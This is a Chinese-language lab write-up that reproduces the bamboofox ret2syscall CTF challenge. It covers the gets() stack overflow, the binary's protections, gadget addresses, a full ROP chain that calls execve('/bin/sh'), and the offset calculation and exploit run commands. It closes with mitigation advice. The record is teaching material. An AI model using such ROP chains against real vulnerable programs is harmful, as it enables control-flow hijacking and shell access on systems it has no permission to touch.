# ret2syscall 复现记录

本记录复现课程 PDF 中 ret2syscall 的配套样例：

```text
/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop
```

这是一个本地教学二进制，只用于理解栈溢出和 ROP。

## 1. 题目行为

程序输出提示后执行 `gets(buf)`，其中 `buf` 是栈上的 100 字节数组。`gets` 不检查输入长度，因此可以覆盖保存的返回地址。程序没有 `system` 调用，也不允许直接使用 shellcode；利用目标是通过 ROP 直接执行 Linux x86 的 `execve` 系统调用。

```c
char *shell = "/bin/sh";
char buf[100];
gets(buf);
```

## 2. 防护与地址

检查命令：

```bash
cd /home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2syscall/bamboofox-ret2syscall
chmod +x rop
file rop
checksec --file=rop
```

关键结果：

```text
ELF 32-bit LSB executable, Intel 80386
statically linked
No canary found
NX enabled
No PIE (0x8048000)
```

题目使用的固定地址：

| 作用 | 地址 | 指令/数据 |
| --- | --- | --- |
| 设置 eax | `0x080bb196` | `pop eax; ret` |
| 设置 edx、ecx、ebx | `0x0806eb90` | `pop edx; pop ecx; pop ebx; ret` |
| 触发系统调用 | `0x08049421` | `int 0x80` |
| 字符串 | `0x080be408` | `/bin/sh` |

可用以下命令复核 gadget：

```bash
objdump -d -Mintel rop --start-address=0x080bb190 --stop-address=0x080bb1a0
objdump -d -Mintel rop --start-address=0x0806eb88 --stop-address=0x0806eb9c
objdump -d -Mintel rop --start-address=0x0804941d --stop-address=0x08049425
```

## 3. 系统调用参数

在 32 位 Linux 中，`execve` 的系统调用号是 `0xb`，通过 `int 0x80` 触发：

```text
eax = 0xb                 # execve
ebx = 0x080be408          # "/bin/sh"
ecx = 0                   # argv = NULL
edx = 0                   # envp = NULL
```

ROP 链按栈上的执行顺序排列：

```text
112 字节填充
0x080bb196                pop eax; ret
0x0000000b                eax = 11
0x0806eb90                pop edx; pop ecx; pop ebx; ret
0x00000000                edx = 0
0x00000000                ecx = 0
0x080be408                ebx = "/bin/sh"
0x08049421                int 0x80
```

`pop ...; ret` 会依次从栈中取出寄存器值和下一条地址，所以整个链不需要可执行栈，也不需要 shellcode。

## 4. 偏移计算

使用 pwntools 的 cyclic pattern 可以确认返回地址偏移：

```bash
python3 - <<'PY'
from pwn import *
print(cyclic_find(0x62616164, n=4))
PY
```

在 GDB 中用 `cyclic(300)` 输入后，崩溃时 EIP 为 `0x62616164`；计算结果为 112。本题的保存返回地址距离 `buf` 起点为 112 字节，题库自带脚本和实际运行均验证为：

```text
offset = 112
```

## 5. 复现

先安装或确认 32 位运行环境和 pwntools，然后执行：

```bash
cd /home/xyx/Desktop/ret2syscall_repro
python3 exploit.py
```

进入交互 shell 后输入：

```text
echo RET2SYSCALL_OK
```

成功输出：

```text
RET2SYSCALL_OK
```

如果直接运行题库自带脚本：

```bash
cd /home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2syscall/bamboofox-ret2syscall
chmod +x rop
printf 'echo RET2SYSCALL_OK\n' | python3 exploit.py
```

## 6. 防护改进

漏洞根源是 `gets` 的无界写入，应改为带长度限制的 `fgets`，并启用栈 canary、PIE、RELRO 和 NX。NX 只能阻止直接执行栈上的代码，不能消除控制流劫持；边界检查是根本修复。
